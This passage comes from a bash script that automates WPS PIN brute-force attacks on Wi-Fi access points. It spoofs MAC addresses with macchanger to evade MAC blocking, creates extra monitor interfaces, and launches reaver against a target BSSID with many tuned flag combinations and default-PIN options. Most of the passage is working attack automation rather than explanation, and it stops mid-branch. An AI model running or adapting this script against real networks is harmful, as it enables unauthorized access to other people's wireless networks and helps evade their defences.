	echo "  ERROR WASH_COUNT=$WASH_COUNT MUST be set to n or N or y or Y ONLY."

		fi

#Error Handeling=ADVANMON=

if [[ $ADVANMON == n || $ADVANMON == N || $ADVANMON == y || $ADVANMON == Y ]]; then

	: # Do nothing

else

	echo "  ERROR ADVANMON=$ADVANMON MUST be set to n or N or y or Y ONLY."

		fi

#Error Handeling=ADVAN_TIME=

if [[ $ADVANMON == y || $ADVANMON == Y ]]; then

case $ADVAN_TIME in

''|*[!0-9]*) echo ERROR ADVAN_TIME=$ADVAN_TIME MUST be a number. ;;
#  *) echo :  ;;

	esac

		fi

#Error Handeling=DAMP_MDK=

if [[ $DAMP_MDK == n || $DAMP_MDK == N || $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

	: # Do nothing

else

	echo "  ERROR DAMP_MDK=$DAMP_MDK MUST be set to n or N or y or Y ONLY."

		fi

if [[ $DAMP_MDK == n || $DAMP_MDK == N || $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

	: # Do nothing

else

	echo "  ERROR DAMP_MDK=$DAMP_MDK MUST be set to n or N or y or Y ONLY."

		fi

if [[ $USE_AIRE1 == n || $USE_AIRE1 == N || $USE_AIRE1 == y || $USE_AIRE1 == Y ]]; then

	: # Do nothing

else

	echo "  ERROR USE_AIRE1=$USE_AIRE1 MUST be set to n or N or y or Y ONLY."

		fi

if [[ $USE_AIRE0 == n || $USE_AIRE0 == N || $USE_AIRE0 == y || $USE_AIRE0 == Y ]]; then

	: # Do nothing

else

	echo "  ERROR USE_AIRE0=$USE_AIRE0 MUST be set to n or N or y or Y ONLY."

		fi

#  Error Handeling USE_DHSMALL=



if [[ $USE_DHSMALL == n || $USE_DHSMALL == N || $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

	: # Do nothing

else

	echo "  ERROR USE_DHSMALL=$USE_DHSMALL MUST be set to n or N or y or Y ONLY."

		fi

#  Error Handeling MACSEL=

if [[ $MACSEL == n || $MACSEL == N || $MACSEL == y || $MACSEL == Y ]]; then

	: # Do nothing

else
	echo "  ERROR MACSEL=$MACSEL MUST be set to n or N or y or Y ONLY."

		fi

if [[ $MACSEL == y || $MACSEL == Y ]]; then

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ASSIGN_MAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ASSIGN_MAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ASSIGN_MAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

		echo -e "$txrst    ERROR $ASSIGN_MAC is incorrect!!!"

		fi


	if [ $ALNUM == 0 ]; then
		echo -e "  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

	echo ""
	echo -e "    Mac code entry $ASSIGN_MAC is incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo ""
	echo -e "    Reenter Mac Address in the configuration file."

	echo ""

			fi

		fi

# Error Handel USE_PIXIE=

if [[ $USE_PIXIE == n || $USE_PIXIE == N || $USE_PIXIE == y || $USE_PIXIE == Y ]]; then

	: # Do nothing

else

	echo "  USE_PIXIE=$USE_PIXIE Error MUST be set to n or N or y or Y ONLY."

		fi

# Error Handel USE_FIRSTPIN=

if [[ $USE_FIRSTPIN == n || $USE_FIRSTPIN == N || $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

	: # Do nothing

else

	echo "  USE_FIRSTPIN=$USE_FIRSTPIN Error MUST be set to n or N or y or Y ONLY."

		fi

#Error Handel RETESTPIN=

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

case $RETESTPIN in

	''|*[!0-9]*) echo RETESTPIN=$RETESTPIN Error MUST be a number. ;;
	#  *) echo :  ;;

		esac

	if [ $RETESTPIN -eq 0 ]; then

 echo "  RETESTPIN=$RETESTPIN MUST be number greater than zero(0)"

		fi

			fi

####End  Config Error Handeling End###
echo ""
echo -e "$info   The configuration file:"
echo -e "$yel        /root/VARMAC_CONFIG/$SOURCENAME"
echo -e "$info             is loading......"
echo -e "$info  The file can be changed with leafpad anytime. Make your changes and save."
echo -e "$info  The file is reloaded at the start of Stage II,III and IV.$txtrst"
echo -e "$inp    If no error messages are seen above press$yel (y/Y)$inp to continue...."
echo -e "$inp  If error messages ARE SEEN enter$yel (n/N)$inp and correct the errors."
echo ""
echo -e "$txtrst    Enter y/Y or n/N"

read SOURCEGOODTEST

	case $SOURCEGOODTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"
	rm -f configlist.txt

	done

		done

### Adjust to default of 120 as too short produces sleep errors

sleep 3

clear

### Assign Channel from wash output file to focus reaver on target ####
### comment; This attempts to handle router hopping ###    

sleep 1

CHANNEL_LOCK=$(cat < VARMAC_WASH/wash01.txt | awk -v mac=$TARGETAP1 -F' ' '{ if($1 == mac) {print $2}}')

#echo "$CHANNEL_LOCK" # wash set channel of target
sleep 1

if [ $CHANNEL_LOCK > 0 ]; then

         CHANNEL1=$CHANNEL_LOCK

			fi

####################################

REAVERDIR="VARMAC_LOGS"

#look for empty dir

if [ "$(ls -A $REAVERDIR)" ]; then

      NOTEMPT=1

	fi

if [ $NOTEMPT == 1 ]; then

echo ""    
echo -e "$warn         !!!!The VARMAC_LOG directory is not empty.!!!!$txtrst" 

until  [ $ERASTEST == y ] || [ $ERASTEST == Y ]; do  
echo -e "$txtrst"
echo -e "$q  Do you wish to erase all files in the VARMAC_LOG Directory?"
echo -e "$info     Leaving these files in place will not affect the program."
echo "" 
echo -e "$inp  Type$yel(y/Y)$inp to erase these files or$yel(n/N)$inp to $txtrst"
echo -e "$inp    leave these files in place.$txtrst"
read ERAS

	while true
	do

echo ""
echo -e "$inp  You entered$yel $ERAS$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read ERASTEST

	case $ERASTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done
		done
			fi

#### Erase file in log by selection ####

if [ $ERAS == y ] || [ $ERAS == Y ]; then


	rm -rfv VARMAC_LOGS/* &> /dev/null

		fi

####End Erase file in log by selection End####

################## Retain original names for text warning ##########

NMEWARN1=$NAME1  # Inserts into warning messages in bash
NMEWARN2='""$NAME1""' # Inserts into reaver command string to reaver -e variable handels spaces

##########End retain original name for reaver warnings End########

########### Remove Spaces in Names for file names #########

if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

           CHANNEL1=$CHANNEL_MAN
			fi

NAME1=${NAME1// /_}

##########End Remove Spaces in Names End#########

sleep 2

clear
until  [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear
echo ""
echo -e "$q  How many times do you want the program to cycle thru the targetAP? (COUNT)"
echo ""
echo -e "$warn     !!!!Enter a number less then 100,000!!!!$txtrst"
read COUNT

while  [ $COUNT -gt 99999 ]; do
        echo -e "$warn  !!!Please enter a number less than 100,000!!!"
	echo -e "$q     How many times do you want the program to cycle thru all targetAPs?$txtrst"
      	read COUNT

	done

while true

	do

echo ""
echo -e "$inp  You entered$yel $COUNT$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

###################Debug OLD DNA - Process moved to config file to allow greater flexability

MACBLOCKCHOICE_fn()

{
MACSELTEST=ZZZ

clear

until  [ $MACSELTEST == y ] || [ $MACSELTEST == Y ]; do  

echo ""
echo -e "$info    If you suspect mac address blocking, you can assign specific mac"
echo -e "  addresses to your device and monitors. Choices are provided."
echo ""
echo -e "$inp    If no mac-address blocking is suspected enter$yel (r/R)$inp. Random"
echo -e "  mac addresses will be assigned to device and monitors."
echo ""
echo -e "$inp    If you suspect mac address blocking exists and wish to assign"
echo -e "  a specific address to your device and monitors enter$yel (a/A)$inp."

echo -e "    If you wish help on this subject read the help file enter$yel (h/H)$inp."

echo -e "$warn  !!!WARNING if you select$yel (a/A)$inp read the help files FIRST!!!$txtrst"

read MACSEL

      if  [ $MACSEL == h ] || [ $MACSEL == H ]; then
				clear
				echo ""
				echo ""
				MACBLOCK_fn

				fi

	while true
	do


      if  [ $MACSEL == r ] || [ $MACSEL == R ] || [ $MACSEL == a ] || [ $MACSEL == A ]; then

echo ""
echo -e "$inp  You entered$yel $MACSEL$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"


	elif [ $MACSEL == h ] || [ $MACSEL == H ]; then

echo ""
echo -e "$inp  You entered$yel $MACSEL$info for help type $yel (n/N)$inp to try again.$txtrst"

         else

echo ""
echo -e "$warn Error type $yel (n/N)$inp to try again.$txtrst"

			fi

read MACSELTEST

	case $MACSELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done


if  [ $MACSEL == a ] || [ $MACSEL == A ]; then

	echo -e "$inp    Enter the mac address to assign your wifi device and first monitor.$txtrst"
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handeling exists for this entry.$txtrst"
	read ASSIGN_MAC

	ASSGNERROR_HANDEL_fn

		fi

}
###

FN=1

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

			EVTEN=1

			fi

let COUNTSTART=COUNT

while  [ $COUNT -gt 0 ]; do

echo -e "$txtrst" 

if [ $COUNTSTART -lt 1000 ]; then

	PAD=`printf "%03d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%03d\n" $PF`
		fi	
			fi

if [ $COUNTSTART -gt 999 ] && [ $COUNTSTART -lt 10000 ]; then

	PAD=`printf "%04d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%04d\n" $PF`
		fi
			fi

if [ $COUNTSTART -gt 9999 ] && [ $COUNTSTART -lt 100000 ]; then

	PAD=`printf "%05d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%05d\n" $PF`
		fi

			fi

echo -e "$txtrst"
DATEFILE=$(date +%y%m%d-%H:%M)

#$TARGETAP1-$DATEFILE-$PAD Note hours and min added to avoid overwrite


###Start Default pin function Start###

WPS_DEFAULTPINS_fn

###End  Default pin function End###

### Start MAC Spoofing routines Start ###
# echo -e "Random mac address line 2475"
#########################

if  [ $MACSEL == n  ] || [ $MACSEL == N ]; then

echo -e "$info  Assigning a random mac address to$yel $DEV$info.$txtrst"
sleep 1

ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep 1
macchanger -A $DEV
sleep 2

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $DEV | awk '{print $5}')
            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

	VARMAC=$(ifconfig $DEV | awk '{if ($1 == "ether") {print $2}}') 2>/dev/null

			fi

#VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
sleep 2
ifconfig $DEV hw ether $VARMAC
sleep 2
ifconfig $DEV up

#DEBUG Need time pause for slower computer to complete processes
sleep 2
#DEBUG

echo -e "$info  Assigning$yel $DEV$info mac address to$yel $MON$info. $txtrst"

ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep 2
ifconfig $MON up

#DEBUG  Need time pause for slower computer to complete processes
sleep 2
#DEBUG

### make more monitors and make random macs  ####

if [ $MON == mon0 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon1
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV
	sleep 1 
	MON2=mon2
	sleep 1
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon1 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon2
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon3
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon2 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon3
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon4
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon3 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon4
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon5
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

fi

#assign mac address to device and mon0
###############################

if  [ $MACSEL == y ] || [ $MACSEL == Y ]; then

echo -e "$info  Assigning $ASSIGN_MAC to$yel $DEV$info.$txtrst"
sleep 1

ifconfig $DEV down
sleep .1
iwconfig $DEV mode monitor
sleep 1
macchanger -m $ASSIGN_MAC $DEV
sleep 2
ifconfig $DEV hw ether $ASSIGN_MAC
sleep 2
ifconfig $DEV up

echo -e "$info  Assigning$yel $DEV$info mac address to$yel $MON$info. $txtrst"

ifconfig $MON down
sleep .1
macchanger -m $ASSIGN_MAC $MON
sleep 2
ifconfig $MON up

### make more monitors and make random macs  ####

if [ $MON == mon0 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon1
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon2
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon1 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon2
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon3
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon2 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon3
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon4
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon3 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon4
	ifconfig $MON1 down
	sleep 1
        macchanger -A $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon5
	ifconfig $MON2 down
	sleep 1
        macchanger -A $MON2
	sleep 2
        ifconfig $MON2 up

		fi


sleep 2

VARMAC=$ASSIGN_MAC

fi

###End assign mac address to deviceandmon0 End###

###End make more monitors and make random macs End####

# Assign variables to monitor mac addresss 

MONMAC_fn

sleep 5
##### Handel -1 issue #####

#find /etc/NetworkManager/system-connections -type f -exec  "sed -i \"/^cloned-mac-address.*/d;/^\[802-11-wireless\]/a\cloned-mac-address=$MONMAC0\" \"{}\"" \;

ifconfig $DEV down
sleep .1
iwconfig $DEV mode monitor
sleep .1
ifconfig $DEV up

#ifconfig $MON down
#sleep .1
#iwconfig $MON mode monitor
#sleep .1
#ifconfig $MON up



#####End Handel -1 issue End#####
###End MAC Spoofing routines End###

sleep 2 
clear

###Start Reaver Program Booleans Start no -e essid###

echo " "
echo " Program is starting please standby......"

#~~~~~~~~~~~~~Start Reaver Booleans Start~~~~~~~~~~~~~~~~~#

R_BOOLEANS_fn()

{

MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])
###Start All no --dh-small -S Start#####

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver3-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi		

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1h-no dh" -e "reaver -i $MON -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2h-no dh" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

